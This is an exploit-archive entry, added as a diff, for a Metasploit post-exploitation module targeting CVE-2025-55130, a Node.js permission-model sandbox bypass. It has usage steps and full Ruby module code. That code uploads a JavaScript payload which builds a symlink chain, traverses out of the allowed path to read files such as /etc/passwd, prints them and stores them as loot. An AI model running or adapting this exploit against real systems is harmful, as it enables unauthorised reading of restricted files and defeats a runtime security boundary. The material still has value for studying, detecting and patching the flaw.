@@ -1,0 +1,496 @@
+=============================================================================================================================================
+| # Title     : Node.js 25.x Permission Model Sandbox Bypass via Symlink Path Traversal                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://nodejs.org/en                                                                                                       |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/214705/ & CVE-2025-55130
+
+[+] Summary    : This module validates a sandbox escape weakness in the Node.js permission model that allows restricted file access bypass through symlink-based path traversal. 
+                 When Node.js is executed with the --permission flag and limited filesystem read/write paths, the permission checks rely on logical paths but fail to revalidate resolved real paths after symlink resolution.
+                 As a result, an attacker with local code execution in a Node.js runtime can read files outside the permitted filesystem scope, violating the intended sandbox guarantees. 
+				 This issue does not result in system privilege escalation; instead, it represents a runtime security boundary bypass within Node.js applications that depend on the permission model for isolation.
+                 The module is implemented as a post-exploitation verification tool, safely demonstrating the weakness and optionally confirming exploitability without modifying system state.
+
+[+] Usage :
+
+1. Basic Testing:
+
+use post/multi/nodejs/sandbox_bypass
+set SESSION 1
+set TARGET_FILE /etc/passwd
+run
+
+2. With Process Checking:
+
+use post/multi/nodejs/sandbox_bypass
+set SESSION 1
+set SCAN_NODE_PROCESSES true
+set CHECK_PERMISSIONS true
+run
+
+3. Safe Testing Mode:
+
+use post/multi/nodejs/sandbox_bypass
+set SESSION 1
+set TEST_MODE true
+set AUTOREMOVE true
+run
+
+[+] POC : 
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Post
+  include Msf::Post::File
+  include Msf::Post::Common
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Node.js Permission Model Sandbox Bypass File Reader',
+      'Description'    => %q{
+        This module exploits CVE-2025-55130, a Node.js permission model bypass
+        vulnerability that allows escaping the --allow-fs-read/write sandbox restrictions
+        via symlink path traversal. 
+        
+        The module must be executed in a Meterpreter session where the target
+        system has a vulnerable Node.js installation with permission model enabled.
+        It demonstrates sandbox escape by reading arbitrary files from the filesystem
+        that should be restricted by the permission model.
+        
+        Note: This is NOT a privilege escalation exploit. It bypasses Node.js
+        permission model sandbox restrictions when Node.js is already running with
+        --permission flag. It does not elevate system privileges.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+        'indoushka'
+      ],
+      'References'     => [
+        ['CVE', '2025-55130'],
+        ['URL', 'https://securityonline.info/cve-2025-55130-node-js-permission-model-bypass-sandbox-escape-vulnerability/']
+      ],
+      'Platform'       => ['nodejs', 'unix', 'linux'],
+      'Arch'           => [ARCH_NODEJS, ARCH_X64, ARCH_X86],
+      'SessionTypes'   => ['meterpreter', 'shell'],
+      'Notes'          => {
+        'Stability'   => [CRASH_SAFE],
+        'SideEffects' => [ARTIFACTS_ON_DISK],
+        'Reliability' => [REPEATABLE_SESSION],
+        'Type'        => 'sandbox_escape',
+        'AKA'         => ['Node.js Permission Model Bypass']
+      }
+    ))
+
+    register_options([
+      OptString.new('TARGET_FILE', [
+        true, 
+        'File to attempt reading (must be outside allowed paths)',
+        '/etc/passwd'
+      ]),
+      OptString.new('NODE_PATH', [
+        false,
+        'Path to Node.js executable (auto-detected if not set)',
+        ''
+      ]),
+      OptString.new('ALLOWED_PATH', [
+        true,
+        'Path that would be allowed in --allow-fs-read/write',
+        '/tmp'
+      ]),
+      OptBool.new('AUTOREMOVE', [
+        true,
+        'Automatically remove exploit files',
+        true
+      ]),
+      OptString.new('WRITEABLE_DIR', [
+        true,
+        'Writable directory for exploit files',
+        '/tmp'
+      ]),
+      OptBool.new('CHECK_PERMISSIONS', [
+        true,
+        'Check if Node.js processes are running with permission model',
+        true
+      ]),
+      OptBool.new('SCAN_NODE_PROCESSES', [
+        true,
+        'Scan for running Node.js processes with permission flags',
+        false
+      ])
+    ])
+
+    register_advanced_options([
+      OptBool.new('VERIFY_READ', [
+        true,
+        'Verify file can be read after exploit',
+        true
+      ]),
+      OptInt.new('EXPLOIT_TIMEOUT', [
+        true,
+        'Timeout for exploit execution (seconds)',
+        30
+      ]),
+      OptBool.new('TEST_MODE', [
+        true,
+        'Test mode - create test file instead of reading target',
+        false
+      ])
+    ])
+  end
+
+  def run
+    print_status("Starting Node.js Permission Model Sandbox Bypass Module")
+
+    unless session
+      fail_with(Failure::BadConfig, "This module requires an active session")
+    end
+
+    node_path = detect_nodejs
+    unless node_path
+      fail_with(Failure::NotFound, "Node.js not found on target system")
+    end
+
+    print_status("Detected Node.js at: #{node_path}")
+
+    node_info = check_nodejs_info(node_path)
+
+    if datastore['SCAN_NODE_PROCESSES']
+      scan_node_processes
+    end
+
+    unless node_info[:has_permission_model]
+      print_warning("Node.js version #{node_info[:version]} may not support permission model")
+      print_warning("Exploit requires Node.js with permission model enabled")
+      
+      unless datastore['CHECK_PERMISSIONS']
+        if Rex::Version.new(node_info[:version]) < Rex::Version.new('20.0.0')
+          print_warning("Permission model was experimental before Node.js 20")
+        end
+      end
+    end
+
+    exploit_dir = create_exploit_dir
+    exploit_file = generate_and_upload_exploit(exploit_dir)
+
+    execute_exploit(node_path, exploit_file, exploit_dir, node_info)
+
+    cleanup_exploit(exploit_dir) if datastore['AUTOREMOVE']
+  end
+
+  def detect_nodejs
+    if datastore['NODE_PATH'].present?
+      if file_exist?(datastore['NODE_PATH']) && executable?(datastore['NODE_PATH'])
+        return datastore['NODE_PATH']
+      else
+        print_warning("Provided NODE_PATH does not exist or is not executable")
+      end
+    end
+
+    possible_paths = [
+      '/usr/bin/node',
+      '/usr/local/bin/node',
+      '/opt/homebrew/bin/node',
+      '/bin/node',
+      'node'
+    ]
+    
+    possible_paths.each do |path|
+      if command_exists?(path)
+        print_good("Found Node.js at: #{path}")
+        return path
+      end
+    end
+    
+    nil
+  end
+  
+  def command_exists?(cmd)
+    result = cmd_exec("command -v #{cmd} 2>/dev/null")
+    result.present? && result.include?(cmd)
+  end
+  
+  def executable?(path)
+    result = cmd_exec("test -x '#{path}' && echo 'executable'")
+    result.include?('executable')
+  end
+
+  def check_nodejs_info(node_path)
+    print_status("Checking Node.js information...")
+    
+    info = {
+      version: 'unknown',
+      has_permission_model: false,
+      supports_experimental: false
+    }
+
+    version_output = cmd_exec("#{node_path} --version")
+    if version_output =~ /v(\d+\.\d+\.\d+)/
+      info[:version] = $1
+      print_status("Node.js version: #{version_output.strip}")
+    else
+      print_warning("Could not parse Node.js version")
+    end
+
+    check_cmd = "#{node_path} -e \"console.log(typeof process.permission !== 'undefined' ? 'HAS_PERMISSION_MODEL' : 'NO_PERMISSION_MODEL')\""
+    permission_check = cmd_exec(check_cmd)
+    
+    if permission_check.include?('HAS_PERMISSION_MODEL')
+      info[:has_permission_model] = true
+      print_good("Node.js has permission model support")
+    else
+      print_warning("Node.js does not have permission model support or running without --permission flag")
+    end
+
+    experimental_check = cmd_exec("#{node_path} --experimental-permission --version 2>&1")
+    if experimental_check.include?('experimental')
+      info[:supports_experimental] = true
+      print_status("Node.js supports --experimental-permission flag")
+    end
+    
+    info
+  end
+
+  def scan_node_processes
+    print_status("Scanning for running Node.js processes with permission model...")
+
+    ps_cmd = "ps aux | grep -E 'node|nodejs' | grep -v grep"
+    processes = cmd_exec(ps_cmd)
+    
+    if processes.present?
+      print_status("Found Node.js processes:")
+      print_line(processes)
+
+      permission_processes = processes.split("\n").select do |line|
+        line.include?('--permission') || line.include?('--experimental-permission') ||
+        line.include?('--allow-fs-read') || line.include?('--allow-fs-write')
+      end
+      
+      if permission_processes.any?
+        print_good("Found #{permission_processes.count} Node.js process(es) running with permission model:")
+        permission_processes.each do |proc|
+          print_line("  #{proc}")
+        end
+
+        permission_processes.each_with_index do |proc, idx|
+          pid = proc.split[1]
+          cmdline = proc.split[10..-1].join(' ')
+          
+          print_status("Process #{idx+1}: PID=#{pid}, Command=#{cmdline}")
+          proc_cwd = cmd_exec("ls -la /proc/#{pid}/cwd 2>/dev/null")
+          if proc_cwd.present?
+            print_status("  CWD: #{proc_cwd}")
+          end
+        end
+      else
+        print_warning("No Node.js processes found running with permission model flags")
+      end
+    else
+      print_status("No Node.js processes found running")
+    end
+  end
+
+  def create_exploit_dir
+    writable_dir = datastore['WRITEABLE_DIR']
+    exploit_dir = "#{writable_dir}/.node_sandbox_test_#{Rex::Text.rand_text_alpha(8)}"
+    
+    print_status("Creating exploit directory: #{exploit_dir}")
+    cmd_exec("mkdir -p #{exploit_dir}")
+
+    allowed_subdir = "#{exploit_dir}/allowed"
+    cmd_exec("mkdir -p #{allowed_subdir}")
+    
+    exploit_dir
+  end
+
+  def generate_and_upload_exploit(exploit_dir)
+    target_file = datastore['TEST_MODE'] ? "#{exploit_dir}/test_secret.txt" : datastore['TARGET_FILE']
+    allowed_path = datastore['ALLOWED_PATH']
+
+    if datastore['TEST_MODE']
+      test_content = "SECRET_TEST_CONTENT_#{Rex::Text.rand_text_alpha(16)}"
+      write_file(target_file, test_content)
+      print_status("Created test file: #{target_file}")
+    end
+    
+    exploit_js = <<~JS
+      const fs = require('fs');
+      const path = require('path');
+
+      const TARGET = '#{target_file}';
+      const ALLOWED_PATH = '#{allowed_path}';
+      const CHAIN = './pwn/a/b/c/d/e/f';
+
+      console.log(`
+       ===========================================================
+        Node.js Permission Model Sandbox Bypass Test by indoushka
+       ===========================================================
+        Target file:        \${TARGET}
+        Allowed path:       \${ALLOWED_PATH}
+        Current directory:  \${__dirname}
+        Node version:       \${process.version}
+       =====================================================
+      `);
+
+      // Check if permission model is active
+      if (typeof process.permission === 'undefined') {
+          console.log('[!] PERMISSION MODEL NOT ACTIVE');
+          console.log('[!] Node.js must be run with: --permission --allow-fs-read=. --allow-fs-write=.');
+          console.log('[!] Without permission model, this is just a symlink test');
+          console.log('[!] Continuing test anyway...\\n');
+      } else {
+          console.log('[+] Permission model is active');
+          console.log('[+] Testing sandbox bypass...\\n');
+      }
+
+      console.log('[*] Creating symlink chain structure...');
+
+      try {
+          fs.rmSync('./pwn', { recursive: true, force: true });
+      } catch(e) {}
+
+      fs.mkdirSync(CHAIN, { recursive: true });
+      fs.symlinkSync(__dirname, CHAIN + '/link');
+
+      const depth = __dirname.split('/').filter(Boolean).length;
+      const traversal = '../'.repeat(depth);
+      const payload = `\${CHAIN}/link/\${traversal}\${TARGET.replace(/^\\//, '')}`;
+      console.log('[*] Symlink chain created');
+      console.log('[*] Traversal depth: ' + depth);
+      console.log('[*] Payload path: ' + payload);
+      console.log('[*] Attempting to read target file...\\n');
+
+      try {
+          const data = fs.readFileSync(payload, 'utf8');
+          console.log('[+] SUCCESS: File read through sandbox bypass!\\n');
+          console.log('--- BEGIN FILE CONTENT ---');
+          console.log(data);
+          console.log('--- END FILE CONTENT ---\\n');
+          
+          if (typeof process.permission !== 'undefined') {
+              console.log('[+] NODE.JS PERMISSION MODEL BYPASS CONFIRMED');
+              console.log('[+] CVE-2025-55130 is exploitable on this system');
+          } else {
+              console.log('[+] Symlink traversal works, but permission model not active');
+          }
+          
+          process.exit(0);
+          
+      } catch (err) {
+          console.log('[-] FAILED to read file');
+          console.log('[-] Error: ' + err.code + ' - ' + err.message);
+          
+          if (err.code === 'ERR_ACCESS_DENIED') {
+              console.log('[-] Permission model blocked access');
+              console.log('[-] System may be patched or not vulnerable');
+          } else if (err.code === 'ENOENT') {
+              console.log('[-] Target file does not exist');
+          }
+          
+          process.exit(1);
+      }
+
+      try {
+          fs.rmSync('./pwn', { recursive: true, force: true });
+      } catch(e) {}
+    JS
+
+    exploit_file = "#{exploit_dir}/sandbox_bypass.js"
+    write_file(exploit_file, exploit_js)
+    cmd_exec("chmod +x #{exploit_file}")
+    
+    print_status("Exploit script written to: #{exploit_file}")
+    exploit_file
+  end
+
+  def execute_exploit(node_path, exploit_file, exploit_dir, node_info)
+    print_status("Executing sandbox bypass test...")
+
+    cmd_exec("cd #{exploit_dir}")
+
+    flags = '--permission'
+    unless node_info[:has_permission_model]
+      print_warning("Node.js may not support permission model, trying experimental flag")
+      flags = '--experimental-permission' if node_info[:supports_experimental]
+    end
+
+    allowed_path = "."
+ 
+    exploit_cmd = "#{node_path} #{flags} --allow-fs-read=#{allowed_path} --allow-fs-write=#{allowed_path} #{exploit_file}"
+    
+    print_status("Running command: #{exploit_cmd}")
+    result = cmd_exec(exploit_cmd, datastore['EXPLOIT_TIMEOUT'])
+
+    parse_exploit_result(result, exploit_dir)
+  end
+
+  def parse_exploit_result(result, exploit_dir)
+    print_status("Exploit output:")
+    print_line(result)
+    
+    if result.include?('SUCCESS: File read through sandbox bypass!')
+      print_good("✓ Sandbox bypass successful!")
+
+      if result =~ /--- BEGIN FILE CONTENT ---(.*?)--- END FILE CONTENT ---/m
+        file_content = $1.strip
+        
+        print_good("File content read successfully")
+
+        loot_name = datastore['TEST_MODE'] ? 'nodejs_sandbox_test' : datastore['TARGET_FILE'].gsub('/', '_')
+        
+        loot_path = store_loot(
+          'nodejs.sandbox.bypass',
+          'text/plain',
+          session,
+          file_content,
+          loot_name,
+          "Node.js Permission Model Sandbox Bypass - #{datastore['TARGET_FILE']}"
+        )
+        
+        print_good("Content saved to: #{loot_path}")
+      end
+      
+      if result.include?('PERMISSION MODEL BYPASS CONFIRMED')
+        print_good(" CVE-2025-55130 confirmed exploitable on this system")
+
+        report_vuln(
+          host: session.session_host,
+          name: 'Node.js Permission Model Sandbox Bypass',
+          refs: references,
+          info: "Node.js permission model bypass via symlink path traversal (CVE-2025-55130)"
+        )
+      end
+      
+    elsif result.include?('Permission model blocked access')
+      print_error(" Permission model prevented access - may be patched")
+    elsif result.include?('PERMISSION MODEL NOT ACTIVE')
+      print_warning(" Permission model not active during test")
+      print_warning("This test only confirms symlink traversal works")
+      print_warning("To test sandbox bypass, Node.js must run with --permission flag")
+    else
+      print_error(" Exploit failed or produced unexpected output")
+    end
+ 
+    print_status("=" * 60)
+    print_status("SUMMARY:")
+    print_status("  - Node.js Sandbox Bypass Test Completed")
+    print_status("  - Exploit Directory: #{exploit_dir}")
+    print_status("  - Target File: #{datastore['TARGET_FILE']}")
+    print_status("  - Test Mode: #{datastore['TEST_MODE'] ? 'Enabled' : 'Disabled'}")
+    print_status("=" * 60)
+  end
+
+  def cleanup_exploit(exploit_dir)
+    print_status("Cleaning up exploit directory: #{exploit_dir}")
+    cmd_exec("rm -rf #{exploit_dir}")
+  end
+end
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
